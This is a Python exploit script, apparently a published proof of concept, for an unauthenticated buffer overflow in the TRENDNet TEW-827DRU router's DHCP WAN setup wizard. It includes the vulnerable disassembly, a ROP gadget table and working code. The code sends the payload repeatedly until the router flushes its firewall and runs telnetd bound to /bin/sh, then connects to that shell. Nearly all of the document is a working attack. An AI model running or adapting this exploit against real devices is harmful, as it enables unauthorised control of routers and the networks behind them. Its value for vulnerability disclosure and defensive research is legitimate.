#!/usr/bin/python3
"""
This script exercises an unauthenticated vulnerability in the TRENDNet TEW-827DRU H/W 2.0 F/W 2.04 to open and connect
to a reverse shell.

The router allows unauthenticated access to the setup wizard functionality. Within the setup wizard there is a buffer
overflow processing the primary and secondary DNS servers while configuring the router for DHCP WAN. The vulnerable
disassembly is shown below. wan_primary_dns or wan_secondary_dns can be used for exploitation, this script uses
wan_secondary_dns.

LOAD:0043BA60                 addiu   $s1, $v0, (aSS_0 - 0x4D0000)  # "%s %s"
LOAD:0043BA64                 la      $v0, aTDelay     # "t_delay"
LOAD:0043BA68                 nop
LOAD:0043BA6C                 addiu   $a0, $v0, (aCameoWanWanPri_0 - 0x4C0000)  # "cameo.wan.wan_primary_dns"
LOAD:0043BA70                 la      $v0, safe_getenv
LOAD:0043BA74                 nop
LOAD:0043BA78                 move    $t9, $v0
LOAD:0043BA7C                 bal     safe_getenv
LOAD:0043BA80                 nop
LOAD:0043BA84                 lw      $gp, 0xA8+saved_gp($fp)
LOAD:0043BA88                 move    $s0, $v0
LOAD:0043BA8C                 la      $v0, aTDelay     # "t_delay"
LOAD:0043BA90                 nop
LOAD:0043BA94                 addiu   $a0, $v0, (aCameoWanWanSec_0 - 0x4C0000)  # "cameo.wan.wan_secondary_dns"
LOAD:0043BA98                 la      $v0, safe_getenv
LOAD:0043BA9C                 nop
LOAD:0043BAA0                 move    $t9, $v0
LOAD:0043BAA4                 bal     safe_getenv
LOAD:0043BAA8                 nop
LOAD:0043BAAC                 lw      $gp, 0xA8+saved_gp($fp)
LOAD:0043BAB0                 addiu   $v1, $fp, 0xA8+var_90
LOAD:0043BAB4                 move    $a0, $v1         # s
LOAD:0043BAB8                 move    $a1, $s1         # format
LOAD:0043BABC                 move    $a2, $s0
LOAD:0043BAC0                 move    $a3, $v0
LOAD:0043BAC4                 la      $v0, sprintf
LOAD:0043BAC8                 nop
LOAD:0043BACC                 move    $t9, $v0
LOAD:0043BAD0                 jalr    $t9 ; sprintf
LOAD:0043BAD4                 nop

The cgi file that contains the exploit was compiled with library randomization enabled meaning the exploit must be
repeatedly thrown until libuClibc gets loaded at the address used as the base in the exploit. Sometimes this is quick,
sometimes it takes a few minutes.

The ROP chain used in the exploit is shown below.
 - rop1 - This router has rather odd behavior, instead of using temporary 's' registers within the function it uses $v0
          and $v1 to move arguments around. Because of this the functions only save $fp and $ra which is kinda hard to
          make useful chains with one registers. The first rop gadget gives us control of $s0 - $s6 to give us a larger
          variety of ROPs available.
 - rop2 - The address of system ends in 0x20, ASCII for space, which we can't directly send in the URL. So, we replace
          the 0x20 with 0x1C and use this gadget to increment the address of system to the proper address.
 - rop3 - Grab a string off the stack and call system with it.

---------------------------------------------------------------
| Gadget Name | Gadget Offset | Gadget Summary                |
---------------------------------------------------------------
| rop1        | 0x0003E164    | lw      $ra, 0x40+var_4($sp)  |
|             |               | lw      $s6, 0x40+var_8($sp)  |
|             |               | lw      $s5, 0x40+var_C($sp)  |
|             |               | lw      $s4, 0x40+var_10($sp) |
|             |               | lw      $s3, 0x40+var_14($sp) |
|             |               | lw      $s2, 0x40+var_18($sp) |
|             |               | lw      $s1, 0x40+var_1C($sp) |
|             |               | lw      $s0, 0x40+var_20($sp) |
|             |               | jr      $ra                   |
|             |               | addiu   $sp, 0x40             |
---------------------------------------------------------------
| rop2        | 0x00053168    | addiu   $s3, 4                |
|             |               | move    $t9, $s5              |
|             |               | jalr    $t9                   |
|             |               | lw      $a0, 0($s3)           |
---------------------------------------------------------------
| rop3        | 0x0003CA64    | addiu   $a0, $sp, 0x70+var_48 |
|             |               | li      $a1, 1                |
|             |               | move    $t9, $s3              |
|             |               | jalr    $t9                   |
|             |               | move    $a2, $s5              |
---------------------------------------------------------------

The overflow is generated using the Mips Overflow Writer from https://github.com/fuzzywalls/mow
"""
import mow
import time
import argparse
import telnetlib


def telnet_connect(host, port):
    """
    Connect to telnet server.

    :param host: Telnet server IP address.
    :type host: str

    :param port: Telnet server listening port.
    :type port: int

    :return: Telnet session or None
    """
    try:
        return telnetlib.Telnet(host, port, 0.1)
    except:
        return None


def generate_exploit_packet(host, port, command):
    """
    Generate packet to exploit the target.

    :param host: Target IP address.
    :type host: str

    :param port: Target listening port.
    :type port: int

    :param command: Command to execute on successful exploitation.
    :type command: str

    :return: Packet to send to target.
    :rtype: bytes
    """
    rop1 = 0x3e164
    rop2 = 0x53168
    rop3 = 0x3ca64

    system = 0x57b1c

    overflow = mow.Overflow(0x90, 3, mow.LITTLE_ENDIAN, 0, 0x76fd5000, '1 ')
    overflow.ra = rop1
    overflow.add_to_stack(0x3c, address=rop2)
    overflow.add_to_stack(0x34, address=rop3)
    overflow.add_to_stack(0x2c, address=system)
    overflow.add_to_stack(0x68, command=command.replace(' ', '${IFS}'))
    overflow_string = overflow.generate()

    data = {b'ccp_act': b'set',
            b'action': b'wizard_wan',
            b'cameo.wan.wan_proto': b'dhcpc',
            b'cameo.wan.wan_primary_dns': b'1',
            b'cameo.wan.wan_secondary_dns': overflow_string}

    # Build the data into key=value&key1=value1&key2=value2 form.
    data = b'&'.join(b'%s=%s' % (key, value) for key, value in data.items())

    request = mow.CustomRequest(host, port, mow.POST, b'apply_sec.cgi', data=data)
    packet = request.create_packet()
    return packet


def exploit_target(host, port, telnet_port):
    """
    Repeatedly attempt to exploit the target until a reverse shell is established.

    :param host: IP address of the target.
    :type host: str

    :param port: Listening port of the target.
    :type port: int

    :param telnet_port: Port to open to establish the telnet connection.
    :type telnet_port: int
    """
    telnet_command = 'iptables -F|telnetd -l /bin/sh -p %d' % telnet_port
    packet = generate_exploit_packet(host, port, telnet_command)

    print('Repeatedly throwing exploit...this may take some time. Shell will appear when it succeeds.')

    tn = telnet_connect(host, telnet_port)
    while tn is None:
        try:
            mow.send_packet(host, port, packet)
        except:
            continue
        tn = telnet_connect(host, telnet_port)
        time.sleep(.1)

    tn.interact()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Unauthenticated buffer overflow processing DHCP WAN setup wizard '
                                                 'parameters in the TRENDNet TEW-827DRU.')

    parser.add_argument('-i', '--ip', help='Target IP address', required=True)
    parser.add_argument('-p', '--port', help='Target port.', type=int, default=80)
    parser.add_argument('-t', '--tport', help='Telnet port to connect to on successful exploitation.', type=int,
                        default=5555)

    args = parser.parse_args()

    exploit_target(args.ip, args.port, args.tport)
